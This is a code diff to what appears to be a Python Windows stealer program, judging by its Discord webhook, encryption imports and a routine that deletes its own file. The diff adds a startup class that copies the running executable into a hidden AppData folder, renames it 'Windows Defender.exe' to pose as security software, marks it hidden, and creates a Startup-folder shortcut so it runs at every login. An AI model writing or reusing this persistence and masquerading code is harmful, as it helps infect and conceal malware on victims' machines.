@@ -18,6 +18,7 @@ from zipfile import ZipFile
 
 import psutil
 import requests
+import winshell
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
@@ -513,18 +514,44 @@ class debug:
         os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
         exit()
 
-def startup():
-    fakename = "Windows Defender.exe"
-    
-    cwf = r"{}\{}".format(os.getcwd(), os.path.basename(sys.argv[0]))
-    
-    usagelogs = r"C:\Users\{}\AppData\Local\Microsoft\CLR_v4.0\UsageLogs" + f"\\UsageLogsTemp\\{fakename}"
-
-    # if not cwf == startup.format(os.getlogin(), os.path.basename(sys.argv[0])):
-    #     SetFileAttributes(cwf, FILE_ATTRIBUTE_HIDDEN)
-    #     os.rename(cwf, startup.format(os.getlogin(), os.path.basename(sys.argv[0])))  
+class startup:
+    def __init__(self):
+        self.fakename = "Windows Defender.exe"
         
-    #     os.rename(startup.format(os.getlogin(), os.path.basename(sys.argv[0])), startup.format(os.getlogin(), fakename))
+        self.cwf = f"{os.getcwd()}\\{sys.argv[0].replace(os.getcwd(), '')}"
+        self.dest_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\UsageLogTemp"
+        self.startup_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+        
+        if self.skip(self.dest_path):
+            return
+        
+        self.exists(self.dest_path)
+        self.exists(self.startup_path)
+
+        self.target = f"{self.dest_path}\{sys.argv[0].replace(os.getcwd(), '')}"
+        
+        self.mv_file(self.cwf, self.target)
+        self.mk_shortcut(self.target, self.startup_path, self.fakename)
+        self.ed_file(self.dest_path, self.fakename)
+        
+    def skip(self, path):
+        if os.getcwd() == path:
+            return True
+          
+    def exists(self, path):
+        if not os.path.exists(path):
+            os.makedirs(path)
+
+    def mv_file(self, cwf, dest):
+        os.rename(cwf, dest)
+        
+    def mk_shortcut(self, target, startup_path, fakename):
+        winshell.CreateShortcut(Path=f"{startup_path}\{fakename.replace('.exe', '')}.lnk", Target=target)
+    
+    def ed_file(self, dest, fakename):
+        
+        os.rename(f"{dest}\\{sys.argv[0].replace(os.getcwd(), '')}", f"{dest}\\{fakename}")
+        SetFileAttributes(f"{dest}\\{fakename}", FILE_ATTRIBUTE_HIDDEN)
                             
 if __name__ == '__main__':
     if os.name != "nt":
